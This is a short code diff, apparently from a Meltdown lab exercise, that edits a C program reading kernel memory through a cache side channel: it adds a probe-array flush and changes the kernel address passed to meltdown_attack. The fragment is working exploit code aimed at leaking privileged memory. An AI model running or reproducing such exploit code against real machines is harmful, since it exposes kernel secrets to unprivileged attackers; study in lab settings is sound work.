@@ -93,6 +93,7 @@ int main(){
     }
 
 
+    flush_probe_array();
     for(int secret_index = 0; secret_index < 8; secret_index++){
         for(int i = 0; i < 1000; i++){
 	        ret = pread(fd, NULL, 0, 0);
@@ -104,7 +105,7 @@ int main(){
             flush_probe_array();
 
             if(sigsetjmp(env, 1) == 0){
-                meltdown_attack(0xffffffffc0f3c000 + secret_index);
+                meltdown_attack(0xffffffffc0d55000 + secret_index);
             }
 
             get_access_time();
